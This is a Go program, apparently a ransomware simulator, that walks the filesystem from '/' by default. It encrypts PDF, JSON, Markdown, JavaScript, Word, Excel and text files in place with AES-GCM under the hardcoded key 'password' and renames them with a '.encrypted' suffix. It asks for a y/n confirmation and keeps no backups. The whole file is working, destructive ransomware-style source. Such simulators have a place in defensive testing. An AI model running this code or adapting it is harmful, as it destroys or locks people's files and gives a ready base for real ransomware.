package main

// Quick and dirty ransomware simulator
// Searches file system for office files and encrypts them

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
)

func main() {

	root := "/"

	if len(os.Args) == 2 {
		root = os.Args[1]
	}

	fmt.Println("Using root of:", root)
	files := []string{}
	err := filepath.Walk(root,
		func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			if filepath.Ext(path) == ".pdf" || filepath.Ext(path) == ".json" || filepath.Ext(path) == ".md" || filepath.Ext(path) == ".js" || filepath.Ext(path) == ".docx" || filepath.Ext(path) == ".xlsx" || filepath.Ext(path) == ".txt" {
				files = append(files, path)
			}
			return nil
		})
	if err != nil {
		log.Println(err)
	}

	var ans string
	fmt.Printf("You are about to encrypt %d files. Are you cool with that? [y/n]: ", len(files))
	fmt.Scanln(&ans)
	if strings.ToLower(ans) != "y" {
		log.Fatalln("Bye!")
	}

	for _, inFile := range files {
		// let's encrypt the files
		encKey := "password"

		encKeySha256 := sha256.Sum256([]byte(encKey))

		// generate aes cipher black
		c, err := aes.NewCipher(encKeySha256[:])
		if err != nil {
			log.Println("Unable to create AES cipher")
			log.Fatalln(err)
		}

		// create GCM operater
		gcm, err := cipher.NewGCM(c)
		if err != nil {
			log.Println("Unable to create GCM")
			log.Fatalln(err)
		}

		// create nonce
		nonce := make([]byte, gcm.NonceSize())
		if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
			log.Println("Unable to create nonce.")
			log.Fatalln(err)
		}

		// encrypt payload
		log.Printf("Encrypting payload %s", inFile)
		payload, err := ioutil.ReadFile(inFile)
		if err != nil {
			log.Println("Unable to read payload.")
			log.Fatalln(err)
		}

		encryptedPayload := gcm.Seal(nonce, nonce, payload, nil)

		// open output file
		outFile := inFile
		f, err := os.Create(outFile)
		if err != nil {
			log.Println("Unable to create output file.")
			log.Fatalln(err)
		}
		defer f.Close()

		if _, err := f.Write(encryptedPayload); err != nil {
			log.Println("Unable to write payload.")
			log.Fatalln(err)
		}
		f.Close()

		//rename file
		os.Rename(inFile, inFile+".encrypted")
	}
}
